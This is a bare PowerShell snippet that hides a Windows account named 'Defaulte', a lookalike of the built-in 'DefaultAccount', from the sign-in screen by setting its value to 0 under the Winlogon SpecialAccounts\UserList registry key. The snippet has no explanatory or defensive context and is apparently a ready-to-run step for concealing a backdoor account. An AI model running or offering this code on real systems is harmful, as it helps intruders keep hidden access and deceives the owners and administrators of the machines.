$User = "Defaulte"
$Path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
New-ItemProperty -Path $Path -Name $User -Value 0 -PropertyType DWORD -Force
